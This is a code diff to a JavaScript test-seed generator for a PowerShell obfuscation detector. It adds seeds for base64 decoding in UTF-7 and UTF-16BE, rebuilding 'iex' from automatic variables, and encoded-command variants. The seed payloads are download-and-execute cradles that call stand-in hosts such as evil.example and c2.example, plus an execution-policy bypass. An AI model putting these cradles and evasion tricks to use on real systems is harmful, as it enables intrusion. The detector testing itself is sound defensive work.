@@ -34,6 +34,10 @@ const POWERSHELL_TECHNIQUE_CATALOG = Object.freeze([
   "PowerShell [Convert]::FromBase64String + UTF8.GetString",
   "PowerShell [Convert]::FromBase64String + UNICODE.GetString",
   "PowerShell [Convert]::FromBase64String + ASCII.GetString",
+  // Rare but real in the wild — UTF-7 (CVE-era PHP webshells / ADFS
+  // backdoors) and UTF-16BE (`BigEndianUnicode` / `Unicode.BE`).
+  "PowerShell [Convert]::FromBase64String + UTF7.GetString",
+  "PowerShell [Convert]::FromBase64String + BIGENDIANUNICODE.GetString",
   'PowerShell -bxor Inline-Key Decode',
   'PowerShell [scriptblock]::Create',
   'PowerShell AMSI Bypass',
@@ -191,6 +195,25 @@ function genVariableResolution() {
     "$arr = @('Invoke','Expression'); & ($arr[0]+'-'+$arr[1])",
     'Invoke',
   ));
+  // Automatic-variable index abuse. `$VerbosePreference` is
+  // `SilentlyContinue` by default on a stock PowerShell install — chars
+  // 1 and 3 are `i` and `e`, so `$VerbosePreference.toString()[1,3]` +
+  // `'x'` -join '' reconstructs `iex` without ever spelling it. The
+  // PS-mini-evaluator's `KNOWN_PS_AUTO_VARS` table is the authoritative
+  // ground truth; these seeds exercise the string-index accessor chain
+  // that real ARK/Invoke-Obfuscation droppers use.
+  out.push(makeSeed(
+    "$a = $VerbosePreference.toString()[1,3] + 'x' -join ''; & ($a)",
+    'iex',
+  ));
+  out.push(makeSeed(
+    "& ($VerbosePreference.toString()[1,3] + 'x' -join '') 'whoami'",
+    'iex',
+  ));
+  out.push(makeSeed(
+    "$b = $ShellID[0,1,2,3,4,5,6,7,8,9] -join ''; & ($b)",
+    'Microsoft',
+  ));
   return out;
 }
 
@@ -218,16 +241,27 @@ function genEncodedCommand() {
   // PowerShell stager. Three arg spellings (-EncodedCommand / -enc /
   // -ec), plus an inline vs newline-terminated form.
   const out = [];
+  // Each payload carries its own expected atom — the per-payload kw
+  // must literally appear in the decoded UTF-16LE plaintext (not just
+  // in the host command-line). Using 'Invoke' for payloads that read
+  // `IEX …` / `Start-Process …` produced fake miss signals because
+  // the decoder correctly emits the literal payload text.
   const payloads = [
-    'Invoke-Expression (New-Object Net.WebClient).DownloadString("http://evil.example/p.ps1")',
-    "IEX (iwr -UseBasicParsing 'http://c2.example/s'); whoami",
-    'Start-Process powershell -Arg "-Command","Set-ExecutionPolicy Bypass; iex $_"',
+    { text: 'Invoke-Expression (New-Object Net.WebClient).DownloadString("http://evil.example/p.ps1")', kw: 'Invoke-Expression' },
+    { text: "IEX (iwr -UseBasicParsing 'http://c2.example/s'); whoami",                                kw: 'IEX' },
+    { text: 'Start-Process powershell -Arg "-Command","Set-ExecutionPolicy Bypass; iex $_"',          kw: 'Start-Process' },
   ];
-  for (const pl of payloads) {
+  for (const { text: pl, kw } of payloads) {
     const b64 = _toBase64Utf16LE(pl);
-    out.push(makeSeed(`powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand ${b64}`, 'Invoke'));
-    out.push(makeSeed(`pwsh -NoP -Enc ${b64}\n`, 'Invoke'));
-    out.push(makeSeed(`powershell -ec ${b64}`, 'Invoke'));
+    out.push(makeSeed(`powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand ${b64}`, kw));
+    out.push(makeSeed(`pwsh -NoP -Enc ${b64}\n`, kw));
+    out.push(makeSeed(`powershell -ec ${b64}`, kw));
+    // -EncodedArgument alias (less common but accepted by the decoder
+    // and used by a handful of Empire/PowerSploit forks).
+    out.push(makeSeed(`powershell.exe -NoP -EncodedArgument ${b64}`, kw));
+    // En-dash (U+2013) instead of ASCII hyphen — Word/PDF droppers
+    // often autocorrect `-enc` to `–enc` and the decoder accepts it.
+    out.push(makeSeed(`powershell.exe \u2013Enc ${b64}`, kw));
   }
   return out;
 }
@@ -269,6 +303,25 @@ function genConvertFromBase64String() {
     ));
     out.push(makeSeed(
       `[Encoding]::ASCII.GetString([Convert]::FromBase64String('${_toBase64Utf8(p.text)}'))`,
+      p.kw,
+    ));
+    // UTF7 is labelled but decodes via UTF-8 fallback in the detector
+    // (TextDecoder support for utf-7 is non-portable); payloads here
+    // stay ASCII so the fallback produces the correct plaintext.
+    out.push(makeSeed(
+      `[Encoding]::UTF7.GetString([Convert]::FromBase64String('${_toBase64Utf8(p.text)}'))`,
+      p.kw,
+    ));
+    // BigEndianUnicode is UTF-16BE — swap byte order from the UTF-16LE
+    // helper so the detector's `utf-16be` label path decodes it.
+    const beBytes = Buffer.from(_toBase64Utf16LE(p.text), 'base64');
+    for (let i = 0; i + 1 < beBytes.length; i += 2) {
+      const lo = beBytes[i];
+      beBytes[i] = beBytes[i + 1];
+      beBytes[i + 1] = lo;
+    }
+    out.push(makeSeed(
+      `[Encoding]::BigEndianUnicode.GetString([Convert]::FromBase64String('${beBytes.toString('base64')}'))`,
       p.kw,
     ));
   }
